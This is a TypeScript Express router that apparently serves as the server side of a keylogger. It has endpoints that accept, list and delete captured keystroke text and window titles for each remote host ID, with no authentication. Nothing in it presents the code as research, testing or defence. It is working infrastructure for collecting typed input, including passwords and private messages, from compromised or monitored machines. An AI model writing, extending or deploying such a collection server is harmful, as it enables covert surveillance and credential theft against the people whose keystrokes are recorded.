import { Router, type IRouter } from "express";
import { eq, desc } from "drizzle-orm";
import { db, keystrokesTable } from "@workspace/db";
import { serializeDateArray, serializeDates } from "../../lib/serialize";

const router: IRouter = Router();

router.get("/keylogger/:hostId/entries", async (req, res): Promise<void> => {
  const hostId = parseInt(req.params.hostId, 10);
  if (isNaN(hostId)) { res.status(400).json({ error: "Invalid hostId" }); return; }
  const entries = await db.select().from(keystrokesTable).where(eq(keystrokesTable.hostId, hostId)).orderBy(desc(keystrokesTable.createdAt)).limit(500);
  res.json(serializeDateArray(entries));
});

router.post("/keylogger/:hostId/entries", async (req, res): Promise<void> => {
  const hostId = parseInt(req.params.hostId, 10);
  if (isNaN(hostId)) { res.status(400).json({ error: "Invalid hostId" }); return; }
  const { windowTitle = "Unknown", text } = req.body;
  if (!text || typeof text !== "string") { res.status(400).json({ error: "text required" }); return; }
  const [entry] = await db.insert(keystrokesTable).values({ hostId, windowTitle, text }).returning();
  res.status(201).json(serializeDates(entry));
});

router.delete("/keylogger/:hostId/entries", async (req, res): Promise<void> => {
  const hostId = parseInt(req.params.hostId, 10);
  if (isNaN(hostId)) { res.status(400).json({ error: "Invalid hostId" }); return; }
  await db.delete(keystrokesTable).where(eq(keystrokesTable.hostId, hostId));
  res.sendStatus(204);
});

export default router;
